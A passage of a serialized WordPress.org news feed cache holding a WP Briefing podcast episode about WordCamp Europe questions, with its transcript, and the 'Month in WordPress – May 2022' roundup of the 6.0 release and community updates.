WCEU\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:81:\"https://wordpress.org/news/2022/06/episode-33-some-important-questions-from-wceu/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 13 Jun 2022 11:01:44 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:7:\"Podcast\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:11:\"wp-briefing\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:53:\"https://wordpress.org/news/?post_type=podcast&p=13005\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:165:\"WordPress Executive Director Josepha Haden Chomphosy covers some important questions from WordCamp Europe on this special episode of the WordPress Briefing podcast. \";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:9:\"enclosure\";a:1:{i:0;a:5:{s:4:\"data\";s:0:\"\";s:7:\"attribs\";a:1:{s:0:\"\";a:3:{s:3:\"url\";s:60:\"https://wordpress.org/news/files/2022/06/WP-Briefing-033.mp3\";s:6:\"length\";s:1:\"0\";s:4:\"type\";s:0:\"\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"Santana Inniss\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:13788:\"\n<p>In the thirty-third episode of the WordPress Briefing, hear Josepha Haden Chomphosy recap important questions from WordCamp Europe, and a selection of Contributor Day interviews. </p>\n\n\n\n<p><em><strong>Have a question you&#8217;d like answered? You can submit them to <a href=\"mailto:wpbriefing@wordpress.org\">wpbriefing@wordpress.org</a>, either written or as a voice recording.</strong></em><br></p>\n\n\n\n<h2 id=\"credits\">Credits</h2>\n\n\n\n<ul><li>Editor: <a href=\"https://profiles.wordpress.org/dustinhartzler/\">Dustin Hartzler</a></li><li>Logo: <a href=\"https://profiles.wordpress.org/beafialho/\">Beatriz Fialho</a></li><li>Production: <a href=\"https://profiles.wordpress.org/santanainniss/\">Santana Inniss</a></li><li>Production Assistance: <a href=\"https://profiles.wordpress.org/priethor/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/priethor/\">Héctor Prieto</a></li><li>Special Guests: <a href=\"https://profiles.wordpress.org/milana_cap/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/milana_cap/\">Milana Cap</a>, <a href=\"https://profiles.wordpress.org/daugis/\">Daugirdas Jankus</a>, and <a href=\"https://profiles.wordpress.org/desrosj/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/desrosj/\">Jonathan Desrosiers</a></li><li>Song: Fearless First by Kevin MacLeod</li></ul>\n\n\n\n<h2>References</h2>\n\n\n\n<ul><li><em><a href=\"https://en.wikipedia.org/wiki/L%27esprit_de_l%27escalier\" data-type=\"URL\" data-id=\"https://en.wikipedia.org/wiki/L%27esprit_de_l%27escalier\">L&#8217;esprit de l&#8217;escalier</a></em></li><li><a href=\"https://make.wordpress.org/core/2022/05/20/core-editor-improvement-creating-containing-containers/\" data-type=\"URL\">Flexbox Layout Blocks</a></li><li><a href=\"https://make.wordpress.org/training/2022/03/10/recap-of-training-team-meetings-march-8-and-10-2022/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/training/2022/03/10/recap-of-training-team-meetings-march-8-and-10-2022/\">Translating Content on Learn WordPress</a></li><li><a href=\"https://make.wordpress.org/training/handbook/workshops/workshop-subtitles-and-transcripts/translating-subtitles/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/training/handbook/workshops/workshop-subtitles-and-transcripts/translating-subtitles/\">Translating Subtitles</a></li><li><a href=\"https://josepha.blog/2020/01/15/fostering-collaboration-across-cultures/\" data-type=\"URL\" data-id=\"https://josepha.blog/2020/01/15/fostering-collaboration-across-cultures/\">Collaboration Across Cultures</a> (Blog)</li><li><a href=\"https://www.youtube.com/watch?v=8MzJCT2BVV0\" data-type=\"URL\" data-id=\"https://www.youtube.com/watch?v=8MzJCT2BVV0\">Collaboration Across Cultures</a> (YouTube Video)</li><li><a href=\"https://europe.wordcamp.org/2023/call-for-organisers/\" data-type=\"URL\" data-id=\"https://europe.wordcamp.org/2023/call-for-organisers/\">WordCamp Europe Athens: Call for Organizers</a></li><li><a href=\"https://twitter.com/matias_ventura/status/1534602705456480260\" data-type=\"URL\" data-id=\"https://twitter.com/matias_ventura/status/1534602705456480260\">6.1 Release Planning Twitter Thread</a></li><li><a href=\"https://make.wordpress.org/core/2022/06/04/roadmap-to-6-1/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/core/2022/06/04/roadmap-to-6-1/\">6.1 Release Planning Roadmap Post</a></li><li><a href=\"https://make.wordpress.org/meetings/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/meetings/\">Make WordPress Meetings Calendar</a></li></ul>\n\n\n\n<h2>Transcript</h2>\n\n\n\n<span id=\"more-13005\"></span>\n\n\n\n<p>[<strong>Daugirdas Jankus </strong>00:00:04]&nbsp;</p>\n\n\n\n<p>Honestly, it&#8217;s not a secret. It&#8217;s a big part of our business. And I think it&#8217;s like WordPress is a big part of all the hosting company, company’s, businesses, you know? So for us, it is like, we want to make it better. We want to give back. We want to understand, you know, where we can contribute the most. And we see it as a, you know, win, win, win situation for everyone, for clients, for the whole ecosystem.</p>\n\n\n\n<p>And for us as a business, of course!</p>\n\n\n\n<p>[<strong>Milana Cap </strong>00:00:32]&nbsp;</p>\n\n\n\n<p>My favorite WordPress component is WP CLI. That&#8217;s my crush, haha, because I love terminal. I love doing it. I&#8217;m not a really UI type of person, I get lost in UI. But in terminal, you just type command and it does what you want. And a WP CLI is much more powerful than WordPress dashboard. You can do so many things there and you can have fun.</p>\n\n\n\n<p>Uh, so that&#8217;s my go-to tool!</p>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:01:10]&nbsp;</p>\n\n\n\n<p>Hello everyone. And welcome to the WordPress Briefing– the podcast where you can catch quick explanations of the ideas behind the WordPress open source project, some insight into the community that supports it, and get a small list of big things coming up in the next two weeks. I&#8217;m your host, Josepha Haden Chomphosy.</p>\n\n\n\n<p>Here we go!</p>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:01:36]&nbsp;</p>\n\n\n\n<p>Many, many people were at WordCamp Europe a couple of weeks ago. And at the end, Matt and I closed out the event sessions with a little question and answer time from the community. I was excited to see everyone and excited to answer their questions. But as with all spur of the moment answers, I experienced this <em>l&#8217;esprit de l&#8217;escalier </em>and I found that there were a few things that I would have answered a little more completely if I had taken more than two seconds to think about them.</p>\n\n\n\n<p>So today I&#8217;m going to augment some of the answers from that session with a little more context and clarity. There was a question from Laura Byrne about favorite blocks in recent WordPress releases. And given that I was exclusively holding WordCamp Europe information in my brain at the time, I couldn&#8217;t think of which block was my favorite. While I was sitting there on that stage,</p>\n\n\n\n<p>I realized that one of my favorite things about WordPress’s 6.0 release, like Matt, wasn&#8217;t really a block, but it was a functional workflow sort of thing. So my favorite thing was the ability to lock blocks, but I mean, the question was about favorite blocks. And so I do know that some of the most anticipated blocks are the Flexbox layout blocks. Whew. What a sentence!</p>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:02:46]</p>\n\n\n\n<p>Try to say that three times fast! Those blocks are the Flexbox layout blocks, they are sort of shortcuts that show up when you&#8217;re selecting multiple blocks and allow for easy side-by-side layouts. I&#8217;m not explaining it in a way that does it much justice, but I will share a link in the show notes that has more information and you can kind of see how empowering that particular block is in the block editor.</p>\n\n\n\n<p>The next question I wanted to give a little more context to came from Courtney Robertson. She asked about how to make translated content more readily available on learn.wordpress.org. My answer was pretty far ranging and talked about why it&#8217;s harder to commit to prioritizing that over, for my example, translating WordPress core.&nbsp;</p>\n\n\n\n<p>But I also understand that there are people who want to help and just need someone to point them in the right direction. And so I want to be clear that it is possible to have workshops in any language on learn.wordpress.org right now. We just don&#8217;t have a lot of people contributing those translations.</p>\n\n\n\n<p>So there are conversations going on right now in the training team about using Glotpress on learn.wordpress.org, and also how to translate subtitles. So, if you are looking for ways to give back through translation and training is an important kind of area of your focus. I will have links to both of those things in the show notes as well.</p>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:04:11]</p>\n\n\n\n<p>I also gave a quick answer, uh, after this question about how hard it is to recognize contributions that are separate from a major event or major release. In this case, when I say recognize, that&#8217;s recognized as in thank, not recognize as in, know it exists. In case it&#8217;s not clear why that was connected, why that answer was connected to the question, training materials are self-serve and not always specific to individual releases of WordPress.</p>\n\n\n\n<p>So that means the maintenance of any content around training happens routinely over the course of time, rather than because of a specific release or a WordCamp. What sometimes can make it a little harder to entice people to join us in that work.&nbsp;</p>\n\n\n\n<p>And now the third question I&#8217;d like to tackle is the one that came from Megan Rose. She asked how we can encourage better diversity as we go back to in-person events. My answer was more about the big picture, program-wide work that has been done and specific awarenesses that I, as a leader, have been keeping top of mind. That answer is still true and is still important, but again, it doesn&#8217;t really help anyone who&#8217;s wondering how they can show up today in their own communities, and do the hard work of fostering an inclusive space there so that we can confidently welcome more diverse voices together.&nbsp;</p>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:05:27]</p>\n\n\n\n<p>A great place to start is to have conversations with people who aren&#8217;t like you and really listen. Also recognizing that we all come from different backgrounds that give us more or less opportunity and always be asking yourself, who is missing from this conversation and why, how can I find them and invite them into our own WordPress spaces?</p>\n\n\n\n<p>If that all kind of feels right up your alley, I would check out the show notes. I&#8217;ll have some links in there to the community team’s site, as well as a few posts that will help you to explore that a bit further as well.&nbsp;</p>\n\n\n\n<p>There were also a couple of questions about market share slash usage of WordPress, and Five for the Future that I really do want to answer, but as I was writing up the context and just kind of exploring the questions that people were raising, it turned out to really be quite a big set of answers.</p>\n\n\n\n<p>So I will do those in either two separate episodes of their own or one surprisingly long, for me, episode. And so there you have it, a lightning round, deep dive on a few questions from WordCamp Europe.</p>\n\n\n\n<p>[<strong>Jonathan Desrosiers </strong>00:06:41]&nbsp;</p>\n\n\n\n<p>Yeah, it&#8217;s definitely great to be back in person. Um, it&#8217;s been a long two years, two or three years for a lot of people and it&#8217;s, it&#8217;s, it&#8217;s great that we&#8217;re such an asynchronous community and we can all stay connected online through Slack and different means. Um, but there are some things that you can&#8217;t replace, like making friends with people and learning people&#8217;s demeanors and having some discussions in person that you can&#8217;t replace.</p>\n\n\n\n<p>And so, uh, I&#8217;m really excited to see people I haven&#8217;t seen in a long time. Meet new people and, um, you know, have some of those discussions here today in Portugal.</p>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:07:21]&nbsp;</p>\n\n\n\n<p>Which then brings us to our small list of big things.&nbsp;</p>\n\n\n\n<p>If you missed the announcement, WordCamp Europe will be in Athens next year. And the call for organizers is open already. It&#8217;s an experience that is absolutely irreplaceable. So I&#8217;ll link to that in the show notes, in case you&#8217;ve always wanted to give back to WordPress that way.</p>\n\n\n\n<p>The second thing on my list is that work on the next major release of WordPress is already underway. There is a post with roadmap info that was published recently, as well as a slightly more casual thread on Twitter. I&#8217;ve linked both of those in the show notes, so that you have some concept of what it is that we are aiming for in 6.1, and also a concept of where to go to get started working on it if that&#8217;s what you feel like doing, uh, for the next three to four months– 120 days, roughly.</p>\n\n\n\n<p>Uh, and finally. This is less of like a thing to be aware of in the next two weeks and kind of a little WordPress project tool tip. Did you know that we have a calendar that shows all meetings for all teams all week long? It will make you feel tired by the amount of work that gets done in the WordPress project every week, but it&#8217;s right there on make.wordpress.org/meetings.</p>\n\n\n\n<p>So you never have to wonder where folks are meeting to talk about things ever again. And that my friends is your small list of big things. Thank you for tuning in today for the WordPress Briefing. I&#8217;m your host, Josepha Haden Chomphosy, and I&#8217;ll see you again in a couple of weeks.</p>\n\n\n\n<p>[<strong>Santana Inniss &amp; Héctor Prieto </strong>00:09:11]&nbsp;</p>\n\n\n\n<p>Hello! Mic test. One, two, one, two.&nbsp;</p>\n\n\n\n<p>We are testing the USB microphone. Let&#8217;s hope we&#8217;re using it actually.&nbsp;</p>\n\n\n\n<p>I think so. I think so.&nbsp;</p>\n\n\n\n<p>Yes. Because now I am far, and now I am much closer to the microphone. Yes.&nbsp;</p>\n\n\n\n<p>And I am sitting in the same spot.&nbsp;</p>\n\n\n\n<p>Good. Hello?&nbsp;</p>\n\n\n\n<p>Hello!&nbsp;</p>\n\n\n\n<p>Mic test one, two.</p>\n\n\n\n<p>Mic test one, two.&nbsp;</p>\n\n\n\n<p>[record scratching sound effect]</p>\n\n\n\n<p>[laughter]</p>\n\n\n\n<p>And, close.</p>\n\n\n\n<p>Mic check.&nbsp;</p>\n\n\n\n<p>Mic check.&nbsp;</p>\n\n\n\n<p>[record scratching sound effect]</p>\n\n\n\n<p>I&#8217;m close to the mic. I&#8217;m far from the mic.&nbsp;</p>\n\n\n\n<p>I&#8217;m far from the mic. Wow.</p>\n\n\n\n<p>Not so far.</p>\n\n\n\n<p>[laughter]</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13005\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:27;a:6:{s:4:\"data\";s:60:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"The Month in WordPress – May 2022\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:67:\"https://wordpress.org/news/2022/06/the-month-in-wordpress-may-2022/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Thu, 02 Jun 2022 11:35:47 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:18:\"Month in WordPress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:18:\"month in wordpress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=12993\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:346:\"WordPress has a lot to celebrate this month. The newest release “Arturo” is here. WordPress turned 19 years old last week. And WordCamp Europe, the first in-person flagship WordCamp in two years, is starting today in Porto, Portugal. Read on to learn more about these and other exciting news around WordPress! Say hello to WordPress [&#8230;]\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"rmartinezduque\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:12516:\"\n<p>WordPress has a lot to celebrate this month. The newest release “Arturo” is here. WordPress turned 19 years old last week. And WordCamp Europe, the first in-person flagship WordCamp in two years, is starting today in Porto, Portugal. Read on to learn more about these and other exciting news around WordPress!</p>\n\n\n\n<hr class=\"wp-block-separator has-css-opacity\" />\n\n\n\n<h2>Say hello to WordPress 6.0 “Arturo”</h2>\n\n\n\n<p><strong>WordPress 6.0 “Arturo” was released on May 24, 2022</strong>. Named in honor of the Latin jazz musician Arturo O’Farrill, the awaited release brings more customization tools and numerous updates to make the site-building experience more intuitive.</p>\n\n\n\n<p>Check out the <a href=\"https://youtu.be/oe452WcY7fA\">WordPress 6.0 video</a> and the <a href=\"https://wordpress.org/news/2022/05/arturo/\">announcement post</a> for an overview of the most important changes. Interested in knowing more about the features that will help you build with and extend WordPress? Then the WordPress 6.0 <a href=\"https://make.wordpress.org/core/2022/05/03/wordpress-6-0-field-guide/\">Field Guide</a> might be for you.</p>\n\n\n\n<figure class=\"wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio\"><div class=\"wp-block-embed__wrapper\">\n<iframe loading=\"lazy\" class=\"youtube-player\" width=\"600\" height=\"338\" src=\"https://www.youtube.com/embed/oe452WcY7fA?version=3&#038;rel=1&#038;showsearch=0&#038;showinfo=1&#038;iv_load_policy=1&#038;fs=1&#038;hl=en-US&#038;autohide=2&#038;wmode=transparent\" allowfullscreen=\"true\" style=\"border:0;\" sandbox=\"allow-scripts allow-same-origin allow-popups allow-presentation\"></iframe>\n</div></figure>\n\n\n\n<p>Over 500+ people in 58+ countries made WordPress 6.0 possible – Thank you!</p>\n\n\n\n<div class=\"is-layout-flex wp-block-buttons\">\n<div class=\"wp-block-button aligncenter\"><a class=\"wp-block-button__link\" href=\"https://wordpress.org/download/\"><strong>Download WordPress 6.0</strong></a></div>\n</div>\n\n\n\n<h2>Happy 19th birthday, WordPress!</h2>\n\n\n\n<p>Time flies, doesn&#8217;t it? Believe it or not, May 27 marked the 19th anniversary of WordPress’ first release! To celebrate, the community put together <a href=\"https://wp19.day/\">a special site</a> (wp19.day) where contributors shared thoughts, videos, live shows, and more.</p>\n\n\n\n<p>You can still join the fun using the hashtag #WP19Day on social media, or even contribute photos of the swag you used to celebrate to the <a href=\"https://wordpress.org/photos/\">WordPress Photo Directory</a>.</p>\n\n\n\n<div class=\"is-layout-flex wp-block-buttons\">\n<div class=\"wp-block-button aligncenter\"><a class=\"wp-block-button__link\" href=\"https://make.wordpress.org/marketing/2022/04/01/grow-your-story-on-wordpress/\"><strong><strong><strong>If you haven&#8217;t yet, this is also a great opportunity to share your WordPress story. Visit the #GrowYourStoryWP initiative to learn more – We’d love to hear from you.</strong></strong></strong></a></div>\n</div>\n\n\n\n<h2>New in Gutenberg</h2>\n\n\n\n<p>Two new versions of Gutenberg were released last month:</p>\n\n\n\n<ul><li><a href=\"https://make.wordpress.org/core/2022/05/12/whats-new-in-gutenberg-13-2-may-11/\">Gutenberg 13.2</a> shipped on May 11, 2022, and brings a new API to save editor preferences on the server, visual guides for padding and margins, and improvements to the Comment block.</li><li><a href=\"https://make.wordpress.org/core/2022/05/26/whats-new-in-gutenberg-13-3-0-may-25/\">Gutenberg 13.3</a> comes with a new Table of Contents block and a number of enhancements to existing blocks to provide more ways to display content, among other highlights. It was released on May 25, 2022.</li></ul>\n\n\n\n<div class=\"is-layout-flex wp-block-buttons\">\n<div class=\"wp-block-button aligncenter\"><a class=\"wp-block-button__link\" href=\"https://make.wordpress.org/core/tag/gutenberg-new/\"><strong><strong>Follow the </strong><strong>#gutenberg-new</strong><strong> posts for more details on the latest updates.</strong></strong></a></div>\n</div>\n\n\n\n<h2>Team updates: Five for the Future, guidelines for in-person regional WordCamps, and more</h2>\n\n\n\n<ul><li>Following an earlier discussion on in-person regional WordCamps, the Community team announced new <a href=\"https://make.wordpress.org/community/2022/05/23/regional-in-person-wordcamps-going-forward/\">guidelines</a> for these WordPress events.</li><li>The Five for the Future (5ftF) initiative is key to ensuring the future of the WordPress project. As part of the ongoing efforts to improve this initiative, Executive Director Josepha Haden suggested a <a href=\"https://make.wordpress.org/project/2022/05/20/defining-five-for-the-future-pledges-contributions/\">definition</a> for 5ftF pledges and contributions.</li><li>Tonya Mork posted a summary of the <a href=\"https://make.wordpress.org/test/2022/05/31/core-test-stats-for-wordpress-6-0/\">core test stats for WordPress 6.0</a>.</li><li>The Meta and Theme Review teams shared an update on the work done over the past year to <a href=\"https://make.wordpress.org/meta/2022/05/23/theme-reviews-improvements/\">improve the theme review process</a>. As a result, the average time for themes to be reviewed has decreased by 90%.</li><li>Josepha Haden kicked off a discussion post to gather feedback on the <a href=\"https://make.wordpress.org/project/2022/05/20/discussion-contrib-handbook-part-3/\">Community Code of Conduct</a> section of the new <a href=\"https://make.wordpress.org/updates/2021/03/16/proposal-a-wordpress-project-contributor-handbook/\">Contributor Handbook</a>.</li><li>On a similar note, the Community team created a new <a href=\"https://make.wordpress.org/updates/2022/05/26/announcement-incident-response-training/\">Incident Response Training</a>. The course, which is live on <a href=\"https://learn.wordpress.org/course/incident-response-team-training/\">Learn WordPress</a> and considered a work in progress, addresses how WordPress contributors take and respond to code of conduct reports.</li><li>The Training team published new lesson plans, workshops, courses, and Social Learning Spaces on Learn WordPress. <a href=\"https://make.wordpress.org/updates/2022/05/01/whats-new-on-learnwp-in-april-2022/\">See what’s new</a>.</li><li>The #WPDiversity working group organized several <a href=\"https://make.wordpress.org/community/2022/05/06/report-allyship-and-diverse-speaker-workshops-april-2022/\">Allyship and Diverse Speaker Workshops</a> in April. Attendees reported a 40% increase in public speaking confidence after attending the Speaker workshops. <a href=\"https://make.wordpress.org/community/tag/wpdiversity/\">Stay tuned</a> for the next events!</li><li>A <a href=\"https://make.wordpress.org/test/2022/05/30/fse-program-rallying-recipe-reviewers-summary/\">summary</a> of the 14th testing call of the Full Site Editing (FSE) Outreach program – “Rallying Recipe Reviewers” was recently published.</li><li>You can also find <a href=\"https://make.wordpress.org/core/2022/05/31/high-level-feedback-from-the-fse-outreach-program-may-2022/\">high-level feedback on the FSE Program</a> in this May 2022 post.</li><li>Learn more about the <a href=\"https://make.wordpress.org/design/2022/05/23/design-share-may-9-20/\">projects</a> the Design team contributed to over the past month.</li><li>Anne McCarthy hosted a Hallway Hangout to talk about various FSE pull requests and designs. The recording is available in <a href=\"https://make.wordpress.org/test/2022/05/25/hallway-hangout-discussion-on-full-site-editing-issues-prs-designs-25-may/\">this post</a>. </li><li>The May editions of the <a href=\"https://make.wordpress.org/community/2022/05/20/meetup-organizer-newsletter-may-2022/\">Meetup Organizer Newsletter</a> and the <a href=\"https://make.wordpress.org/polyglots/2022/05/31/polyglots-monthly-newsletter-may-2022/\">Polyglots Monthly Newsletter</a> were published.</li><li>The latest edition of People of WordPress features the story of <a href=\"https://wordpress.org/news/2022/05/people-of-wordpress-dee-teal/\">Dee Teal</a>.</li></ul>\n\n\n\n<div class=\"is-layout-flex wp-block-buttons\">\n<div class=\"wp-block-button\"><a class=\"wp-block-button__link\" href=\"https://wordpress.org/news/2022/05/episode-31-open-source-accessibility-celebrating-global-accessibility-awareness-day-with-guest-joe-devon/\"><strong><strong>The </strong><strong>thirty-first episode of WP Briefing</strong><strong> celebrated Global Accessibility Awareness Day (May 19) with guest Joe Devon.</strong></strong></a></div>\n</div>\n\n\n\n<h2>Open feedback/testing calls</h2>\n\n\n\n<ul><li>The Core team is working on ​​an experimental pull request (PR) to implement <a href=\"https://make.wordpress.org/core/2022/05/27/block-font-sizes-and-fluid-typography/\">fluid typography</a>. They welcome feedback on design, functionality, and API.</li><li>Version 20.0 of WordPress for <a href=\"https://make.wordpress.org/mobile/2022/05/31/call-for-testing-wordpress-for-android-20-0/\">Android</a> and <a href=\"https://make.wordpress.org/mobile/2022/05/30/call-for-testing-wordpress-for-ios-20-0/\">iOS</a> is now available for testing.</li><li>Were you involved in the WordPress 6.0 release? Take some time to reflect on what you learned and participate with your feedback in this <a href=\"https://make.wordpress.org/core/2022/05/27/wordpress-6-0-arturo-retrospective/\">retrospective</a>.</li></ul>\n\n\n\n<div class=\"is-content-justification-center is-layout-flex wp-container-5 wp-block-buttons\">\n<div class=\"wp-block-button aligncenter\"><a class=\"wp-block-button__link\" href=\"https://make.wordpress.org/project/2022/05/23/request-for-feedback-recording-five-for-the-future-contributions/\"><strong><strong><strong>Angela Jin has asked for feedback to help identify and record Five for the Future contributions from Make teams. </strong><strong>Share your ideas in this post</strong><strong>.</strong></strong></strong></a></div>\n</div>\n\n\n\n<h2>WordCamp Europe is here!</h2>\n\n\n\n<ul><li>WordPress Foundation’s Kim Parsell Memorial Scholarship returns for WordCamp US 2022. <a href=\"https://us.wordcamp.org/2022/the-kim-parsells-memorial-scholarship-apply-now/\">Visit this post</a> for more information.</li><li>The WordCamp US <a href=\"https://us.wordcamp.org/2022/call-for-sponsors-open-wcus/\">Call for Sponsors</a> is now open.</li><li>Two more in-person WordCamps are happening this month:<ul><li><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f1f5-1f1f1.png\" alt=\"🇵🇱\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <a href=\"https://warsaw.wordcamp.org/2022/\">WordCamp Warsaw</a>, Poland on June 11-12, 2022</li><li><img src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f1fa-1f1f8.png\" alt=\"🇺🇸\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <a href=\"https://montclair.wordcamp.org/2022/\">WordCamp Montclair</a>, NJ, USA on June 25, 2022</li></ul></li><li>The WordPress community is meeting today at <a href=\"https://europe.wordcamp.org/2022/\">WordCamp Europe</a> (June 2-4) in Porto, Portugal. This edition celebrates the return to in-person events and the 10th anniversary of WCEU. For everyone heading to Porto, have a great WordCamp!</li></ul>\n\n\n\n<div class=\"is-content-justification-center is-layout-flex wp-container-6 wp-block-buttons\">\n<div class=\"wp-block-button aligncenter\"><a class=\"wp-block-button__link\" href=\"https://wordpress.org/news/2022/05/episode-32-an-open-source-reading-list/\"><strong><strong><strong><strong>Traveling to WCEU? Check out Josepha Haden’s </strong><strong>open source reading list</strong><strong> for interesting reads while you travel!</strong></strong></strong></strong></a></div>\n</div>\n\n\n\n<hr class=\"wp-block-separator has-css-opacity\" />\n\n\n\n<p><strong><em><strong><em>Have a story that we could include in the next issue of The Month in WordPress? Let us know by filling out </em></strong><a href=\"https://make.wordpress.org/community/month-in-wordpress-submissions/\"><strong><em>this form</em></strong></a><strong><em>.</em></strong></em></strong></p>\n\n\n\n<p><em>The following folks contributed to this Month in WordPress: <a href=\'https://profiles.wordpress.org/rmartinezduque/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>rmartinezduque</a>, <a href=\'https://profiles.wordpress.org/laurlittle/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>laurlittle</a>, <a href=\'https://profiles.wordpress.org/harishanker/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>harishanker</a></em>.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"12993\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:28;a:6:{s:4:\"data\";s:72:\"\n		\n		\n		\n		\n		\n				\n		\n		\n		\n		\n		\n		\n\n					\n										\n					\n		\n		\n			